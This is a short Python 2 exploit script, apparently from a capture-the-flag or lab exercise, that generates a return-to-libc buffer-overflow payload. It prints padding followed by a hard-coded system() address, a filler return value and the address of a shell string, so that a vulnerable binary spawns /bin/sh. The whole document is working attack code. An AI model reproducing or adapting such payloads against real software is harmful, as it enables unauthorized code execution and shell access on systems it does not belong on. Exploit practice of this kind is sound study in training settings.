#!/bin/python2

"""
    ROPalicious payload generation
    2015-11-01
    ROT
"""

import sys
from pwn import p32

system_addr = 0x8048330
sh_addr = 0xf7f4e8f9
# sh_addr = 0x0804854c

sys.stdout.write('y')
sys.stdout.write(75*'A')
sys.stdout.write(p32(system_addr))
sys.stdout.write('BBBB')
sys.stdout.write(p32(sh_addr))
sys.stdout.write('\n')
